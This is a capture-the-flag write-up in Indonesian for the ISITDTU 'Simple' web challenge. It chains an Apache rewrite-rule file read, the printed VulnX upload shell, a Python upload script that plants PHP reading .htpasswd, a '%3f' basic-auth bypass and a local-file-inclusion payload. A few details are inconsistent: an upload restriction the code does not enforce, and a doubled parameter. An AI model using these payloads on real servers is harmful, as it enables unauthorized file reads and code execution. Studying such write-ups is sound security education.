# ISITDTU - Simple - Writeup

Pada challenge ini dihadapkan web yang teridi dari `/about`, `/admin`, `/contact`, kita tidak bisa mengakses admin karena diminta autentikasi yang diatur di `.htaccess` basic Auth. setelah kita bisa melakukan bypass terdapat kerentanan LFI di `/admin`, yang memungkinkan kita membaca flag jika di kombinasikan dengan teknik kerentanan `DocumentRoot Apache`

## Foothold
Ketika mengakses `/about`, maka endpoint akan menjadi `http://host/website-about.doc`, ini dikarenakan adanya rule pada konfigurasi apache, berikut file konfigurasinya.
```
<VirtualHost *:80>
    DocumentRoot /var/www/html/src

    <FilesMatch "\.php$">
        SetHandler  "proxy:unix:/run/php/php7.0-fpm.sock|fcgi://localhost/"
    </FilesMatch>

    <Proxy "fcgi://localhost/" enablereuse=on max=10>
    </Proxy>

    <Directory /var/www/html/src/>
        Options FollowSymLinks
        AllowOverride All
    </Directory>


    RewriteEngine On
    RewriteRule  ^/website-(.*).doc$   /$1.html

    RewriteCond %{REQUEST_METHOD} OPTIONS
    RewriteRule ^(.*)$ $1 [R=200,L]

    ErrorLog ${APACHE_LOG_DIR}/error_php.log
    CustomLog ${APACHE_LOG_DIR}/access_php.log combined

</VirtualHost>
```

kode diatas akan mengambil strings setelah `website-` dan sebelum `.doc`, ini bisa kita manfaatkan untuk melakukan enumerasi pada direktori `/usr/share`, yang mana direkori ini dibuka untuk umum.

berikut payload nya:
```
http://<host>/website-/usr/share/<file-to-read>%3f.doc
````
payload diatas akan membaca file apa saja yang terdapat di mesin target dan menampilkannya dalam response.

untuk melakukan pengumpulan informasi saya mencoba melihat `.bash_history` dari admin dan menemukan hal menarik.

```
git clone https://github.com/anouarbensaad/vulnx.git
cd vulnx/
cd /usr/share/vulnx/
rm -rf vulnx/
cd /usr/share/vulnx/
cat /usr/share/vulnx/shell/uploads/shell.php 
cat /usr/share/vulnx/shell/uploads/shell.php
cd /usr/share/vulnx/
ls /usr/share/vulnx/shell/uploads/shell.html 
ls -la /usr/share/vulnx/shell/uploads/shell.html 
cat /usr/share/vulnx/shell/VulnX.php
cat /usr/share/vulnx/shell/VulnX.php
ls /usr/share/vulnx/shell/VulnX.php
ls /usr/share/vulnx/shell/uploads/
cat /usr/share/vulnx/shell/uploads/shell.html
```

root banyak berinteraksi dengan vulnx pada `/usr/share/vulnx`, berikut isi dari direktorinya.
```
root@4b5fbd0e29e3:/usr/share/vulnx/shell# tree
.
|-- VulnX.gif
|-- VulnX.html
|-- VulnX.php
|-- VulnX.php.mp4
|-- VulnX.php.png
|-- VulnX.txt
|-- VulnX.zip
|-- __init__.py
|-- cat
`-- uploads
    `-- shell.html
```

isi dari VulnX.php
```php
<?php

error_reporting(0);
set_time_limit(0);

if($_GET['Vuln']=="X"){
echo "<center><b>Uname:".php_uname()."<br></b>"; 
echo '<font color="black" size="4">';
if(isset($_POST['Submit'])){
    $filedir = "uploads/"; 
    $maxfile = '2000000';
    $mode = '0644';
    $userfile_name = $_FILES['image']['name'];
    $userfile_tmp = $_FILES['image']['tmp_name'];
    if(isset($_FILES['image']['name'])) {
        $qx = $filedir.$userfile_name;
        @move_uploaded_file($userfile_tmp, $qx);
        @chmod ($qx, octdec($mode));
echo" <a href=$userfile_name><center><b>Uploaded Success ==> $userfile_name</b></center></a>";
}
}
else{
echo'<form method="POST" action="#" enctype="multipart/form-data"><input type="file" name="image"><br><input type="Submit" name="Submit" value="Upload"></form>';
}
echo '</center></font>';

}
?>
```

Berdasarkan kode diatas terdapat fitur uploads yang mana file akan dimasukan ke direktori `uploads`, namun karena hanya image yang diperbolehkan kita tidak bisa melakukan upload shell.

setelah explorasi ditemukan ada `shell.html`, pada direktori `uploads/`
```
root@4b5fbd0e29e3:/usr/share/vulnx/shell/uploads# ls -la
total 20
drwxr-xr-x 1 root root 4096 Aug 29 07:58 .
drwxr-xr-x 1 root root 4096 Aug 29 07:17 ..
-rwxrwxrwx 1 root root  298 Oct 31 06:42 shell.html
```
terlihat dari output diatas `shell.html` memiliki permission read, write, dan execute untuk semua user yang ada, kita bisa melakukan overwrite file `shell.html`, dan menyisipkan script php untuk membaca flag yang terdapat di `.htpasswd`, berikut script untuk melakukan overwrite shell.html.

```python
import requests

URL = 'http://localhost:8081/'
path = '/usr/share/vulnx/shell/VulnX.php%3fVuln=X&'
data2 = f'website-{path}.doc'
file_path = "shell.html"
files = {
    'image': open(file_path, 'rb')
}
data = {
    'Submit': 'Upload'
}
response = requests.post(URL+data2, files=files, data=data)
print(response.text)
```
isi shell.html
```php
<?php
// Membaca isi file .htpasswd
$file_path = "/.htpasswd"; // Pastikan path ke .htpasswd sesuai
if (file_exists($file_path)) {
    echo "<pre>" . htmlspecialchars(file_get_contents($file_path)) . "</pre>";
} else {
    echo "File .htpasswd tidak ditemukan atau tidak memiliki izin akses.";
}
?>
```
lalu, setelah berhasil melakukan overwrite kita harus melakukan bypass endpoint `/admin`, yang mengharuskan kita untuk ter-autentikasi dengan basic Auth, yang di konfigurasi di `.htaccess`, untuk bypassny bisa dilakukan dengan cara berikut:
```
http://<host>/admin.php%3foo.php
```
dan berikut kode dari admin.php
```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Page</title>
</head>
<body>
    <h1>Welcome to the Admin Page</h1>

<?php 
error_reporting(0);

if (isset($_GET['pages']) && !empty($_GET['pages']))
{
	$page = "./pages/" . $_GET['pages'] . ".html";
    echo $page;
	include($page);
}
else
{
	echo '<a href="?pages=1"> Link </a>';
}
?>
</body>
</html>

```

karena ada kerentanan LFI kita bisa memanfaatkan itu untuk mengakses shell.html dan mendapatkan flag, berikut payload nya

```
http://<host>/admin.php%3foo.php?pages=pages=../../../../../usr/share/vulnx/shell/uploads/shell
```

Sekian Terimakasih